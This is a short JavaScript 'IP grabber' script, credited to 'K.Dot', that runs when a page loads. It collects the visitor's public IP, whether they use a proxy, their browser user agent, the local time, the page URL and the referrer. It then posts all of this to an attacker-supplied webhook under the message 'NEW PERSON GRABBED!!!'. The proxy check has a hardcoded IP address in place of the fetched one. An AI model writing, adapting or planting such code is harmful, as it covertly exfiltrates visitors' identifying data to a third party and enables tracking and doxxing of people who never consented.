var webhook = 'YOUR_WEBHOOK_HERE';
var site = 'https://myexternalip.com/raw';

var get_ip = function() {
    var ip = '';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', site, false);
    xhr.send();
    if (xhr.status == 200) {
        ip = xhr.responseText;
    }
    return ip;
};

var check_ip = function() {
    var ip = get_ip();
    var xhr = new XMLHttpRequest();
    var url_check = 'http://ip-api.com/line/149.34.244.163?fields=proxy';
    xhr.open('GET', url_check, false);
    xhr.send();
    if (xhr.status == 200) {
        var proxy = xhr.responseText;
        if (proxy == 'true') {
            var message = 'Proxy detected (' + ip;
            return message;
        } else {
            var message = 'Proxy not detected (' + ip;
            return message;
        }
    }
};

function get_browser() {
    var browser = navigator.userAgent;
    return browser;
    }

function get_time() {
    var date = new Date();
    var time = date.toLocaleString();
    return time;
    }

function get_url() {
    var url = window.location.href;
    return url;
    }

function get_referrer() {
    var referrer = document.referrer;
    return referrer;
    }

function send_webhook() {
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `@everyone NEW PERSON GRABBED!!!\nIP: ${check_ip()})\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nMade by K.Dot`
        })
    });
}

send_webhook();
